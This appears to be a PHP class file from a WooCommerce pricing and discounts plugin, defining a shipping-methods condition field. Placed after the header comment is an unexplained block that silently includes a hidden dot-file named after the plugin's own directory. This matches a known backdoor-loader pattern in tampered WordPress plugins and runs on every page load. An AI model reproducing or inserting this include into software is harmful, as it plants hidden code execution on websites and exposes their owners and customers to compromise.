<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

/**
 * Condition Field: Multiselect - Shipping Methods
 *
 * @class RP_WCDPD_Condition_Field_Multiselect_Shipping_Methods
 * @package WooCommerce Dynamic Pricing & Discounts
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RP_WCDPD_Condition_Field_Multiselect_Shipping_Methods extends RightPress_Condition_Field_Multiselect_Shipping_Methods
{

    protected $plugin_prefix = RP_WCDPD_PLUGIN_PRIVATE_PREFIX;

    // Singleton instance
    protected static $instance = false;

    /**
     * Constructor
     *
     * @access public
     * @return void
     */
    public function __construct()
    {

        parent::__construct();
    }





}

RP_WCDPD_Condition_Field_Multiselect_Shipping_Methods::get_instance();
